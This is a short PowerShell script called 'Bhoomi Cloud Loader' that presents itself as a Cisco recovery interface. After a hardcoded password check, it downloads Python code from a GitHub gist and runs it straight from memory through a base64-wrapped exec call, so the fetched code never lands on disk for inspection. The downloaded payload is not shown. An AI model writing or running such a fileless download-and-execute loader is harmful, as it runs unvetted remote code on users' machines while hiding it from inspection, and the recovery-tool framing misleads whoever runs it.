# Bhoomi Cloud Loader
Clear-Host
$C = [ConsoleColor]::Cyan
$W = [ConsoleColor]::White

Write-Host "--- BHOOMI CISCO RECOVERY INTERFACE ---" -ForegroundColor $C
$pass = Read-Host "Enter Access Password"

if ($pass -eq "Dinesh") {
    Write-Host "[+] Authentication Successful. Fetching Engine..." -ForegroundColor Green
    # Link to your Python Gist
    $url = "https://gist.githubusercontent.com/urflameww/e0685a4f3ab6325dceda596f7f45d611/raw/Bhoomi.py"
    $code = (New-Object Net.WebClient).DownloadString($url)
    
    # Execute Python in RAM
    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($code))
    python -c "import base64; exec(base64.b64decode('$encoded').decode('utf-8'))"
} else {
    Write-Host "[-] Access Denied." -ForegroundColor Red
    Start-Sleep -Seconds 2
}